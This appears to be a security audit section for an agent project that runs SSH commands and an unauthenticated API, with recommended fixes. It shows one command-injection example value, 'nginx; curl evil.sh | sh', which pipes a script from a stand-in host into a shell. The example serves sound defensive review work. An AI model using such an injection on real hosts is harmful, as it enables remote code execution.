# 02 — Security 🟠

None of these are currently exploitable end-to-end (the risky tools aren't wired to any
untrusted input yet), but they become live the moment someone connects them — which is the
stated next step. Flagging now, while the fix is cheap.

---

## 2.1 Command injection in SSH tools

**File:** `src/agent/tools/ssh.py:51` (and the general `run_ssh_command` at :6)

```python
async def restart_service(host, service, user="root"):
    return await run_ssh_command(host, f"sudo systemctl restart {service}", user)
```

`service` is interpolated into a remote shell command with no validation. A value like
`nginx; curl evil.sh | sh` runs arbitrary code on the target host. `run_ssh_command` itself
takes an arbitrary command string and runs it as **root** by default.

**Why it matters:** the roadmap is to drive these tools from Discord/LLM output — i.e. from
untrusted or model-generated input. That's a direct path to RCE on managed hosts.

**Fix:**
- Validate `service` against `^[A-Za-z0-9._@-]+$` (systemd unit charset) before use.
- Don't default `user="root"`; require an explicit, least-privileged account.
- Keep `restart_service`/`run_ssh_command` off any LLM- or Discord-reachable path until an
  allowlist of permitted actions exists.

---

## 2.2 API has no authentication and binds `0.0.0.0`

**Files:** `src/agent/config/settings.py:33` (`api_host = "0.0.0.0"`),
`src/agent/api/routes.py` (no auth dependency)

`POST /incidents/{service}` triggers LLM calls and DB writes; anyone who can reach the port
can invoke it. Bound to all interfaces by default.

**Fix for MVP:** default `api_host` to `127.0.0.1`, and/or add a shared-secret header
dependency (`X-API-Key`) checked against a setting. Document that the API is unauthenticated
if you choose to ship it that way.

---

## 2.3 Secrets hygiene (currently OK — keep it that way)

- ✅ `.env` is **not** git-tracked (`.gitignore` covers it) — good.
- ⚠️ The on-disk `.env` contains real live tokens (`DISCORD_BOT_TOKEN`, `OPENAI_API_KEY`,
  `LANGSMITH_API_KEY`). That's fine locally, but: never paste this file into issues/PRs/chat,
  and rotate any token that has been shared. Consider a pre-commit `git secrets`/`gitleaks`
  hook so it can't be committed by accident.
- `StrictHostKeyChecking=accept-new` (`ssh.py:18`) trusts unknown host keys on first
  contact — acceptable for a lab, but note it defeats MITM protection on first connect.
